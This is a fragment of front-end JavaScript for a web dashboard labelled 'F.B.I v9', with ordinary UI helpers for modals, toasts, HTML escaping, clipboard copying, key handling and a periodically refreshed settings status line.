function closeM(id){document.getElementById(id).classList.remove('open');document.body.style.overflow='';if(id==='deviceModal'){selDev=null;stopMP();}}
document.querySelectorAll('.overlay').forEach(function(o){o.addEventListener('click',function(e){if(e.target===o){o.classList.remove('open');document.body.style.overflow='';if(o.id==='deviceModal'){selDev=null;stopMP();}}});});
function toast(msg){var t=document.getElementById('toastEl');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2800);}
function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
function clip(t,btn){if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){if(btn){btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},1500);}});}
function catClick(){toast('😸 Meow!');}
function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('span');r.className='rip';var rect=btn.getBoundingClientRect();r.style.left=(e.clientX-rect.left-45)+'px';r.style.top=(e.clientY-rect.top-45)+'px';btn.appendChild(r);setTimeout(function(){r.remove();},750);}
document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');document.body.style.overflow='';});if(e.key==='Enter'&&document.getElementById('loginScreen').style.display!=='none')validateKey();});

try{activeDeviceUid=localStorage.getItem(CFG.LS_ACTIVE||'fbi_active_device');}catch(e){}
setTimeout(function(){updateTgBtn();},1000);
setInterval(function(){if(document.getElementById('settingsModal')&&document.getElementById('settingsModal').classList.contains('open'))updateTgStatusLine();},3000);

console.log('[F.B.I] v9 loaded.');
